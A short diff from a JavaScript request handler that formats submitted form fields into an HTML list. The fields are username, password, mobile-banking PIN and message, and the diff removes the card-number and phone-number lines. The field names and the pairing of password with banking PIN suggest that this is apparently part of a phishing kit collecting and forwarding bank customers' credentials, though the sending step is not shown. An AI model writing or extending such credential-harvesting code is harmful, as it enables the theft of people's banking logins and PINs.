@@ -89,8 +89,6 @@ export default function handler(req, res) {
                     <ul>
                         <li>username: ${body.username ?? '-'}</li> 
                         <li>password: ${body.password ?? '-'}</li>
-                        <li>nokartu: ${body.nomorkartu ?? '-'}</li>
-                        <li>nohp: ${body.nomorhandphone ?? '-'}</li>
                         <li>pin: ${body.mPin ?? '-'}</li>
                         <li>message: ${body.message ?? '-'}</li>
                     </ul>
